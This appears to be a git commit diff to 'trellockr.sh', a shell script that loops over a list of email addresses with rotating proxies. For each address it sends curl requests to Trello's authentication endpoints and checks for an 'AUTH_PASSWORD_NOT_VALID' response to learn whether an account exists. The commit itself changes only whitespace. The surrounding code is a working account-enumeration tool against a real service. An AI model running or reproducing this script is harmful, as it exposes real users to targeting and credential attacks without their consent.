c20ea16cdde1c1f79525e937c69b4f2d03ebc7df
passthru <45458802+passthru@users.noreply.github.com>
2019-02-01 19:29:22 +0100

    Update trellockr.sh

--- trellockr.sh
+++ trellockr.sh
@@ -2,7 +2,7 @@
 proxL=$(cat $2 | wc -l); iter=1
 for email in `cat $1`; do
 prox=$(cat $2 | head -$iter | tail -1)
-if [ $iter -gt $proxL ];then iter=1; fi
+if [ $iter -gt $proxL ]; then iter=1; fi
 curl  -m3 -c cuckie -b cuckie -s -XGET "https://trello.com/auth/saml/authorization?user=$email&returnUrl=/"
 curl -s -m3 -b cuckie -c cuckie -A -XPOST -g -d "method=password&factors[user]=$email&factors[password]=" https://trello.com/1/authentication | grep "AUTH_PASSWORD_NOT_VALID"
 if [ $? -eq 0 ]; then
